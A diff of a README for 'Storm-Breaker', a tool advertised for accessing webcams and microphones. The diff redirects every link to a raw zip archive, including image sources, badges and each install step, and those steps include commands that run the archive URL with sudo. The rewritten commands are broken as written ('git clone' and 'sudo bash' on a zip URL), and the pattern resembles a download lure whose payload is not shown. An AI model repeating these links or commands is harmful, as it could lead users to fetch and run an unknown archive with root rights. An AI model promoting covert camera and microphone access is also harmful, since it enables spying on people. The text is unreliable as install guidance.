@@ -1,26 +1,26 @@
 <h1 align="center">
   <br>
-  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip"><img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip" alt="Darkside"></a>
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip"><img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip" alt="Darkside"></a>
 
 </h1>
 
 <h4 align="center">A tool with attractive capabilities</h4>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
-    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip">
   </a>
-  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
-    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip"
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip"
          alt="php">
   </a>
 
-  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
-    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip">
   </a>
 </p>
 
-![demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip)
+![demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip)
 
 ### Features:
 
@@ -30,7 +30,7 @@
 - Access Webcam
 - Access Microphone
 
-![save demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip)
+![save demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip)
 
 
 ### Operating Systems Tested
@@ -41,9 +41,9 @@
 
 
 ```bash
-$ git clone https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
+$ git clone https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip
 $ cd Storm-Breaker
-$ sudo bash https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
-$ python3 -m pip install -r https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
-$ sudo python3 https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
+$ sudo bash https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip
+$ python3 -m pip install -r https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip
+$ sudo python3 https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/webcam/images/Storm-Breaker-3.8.zip
 ```
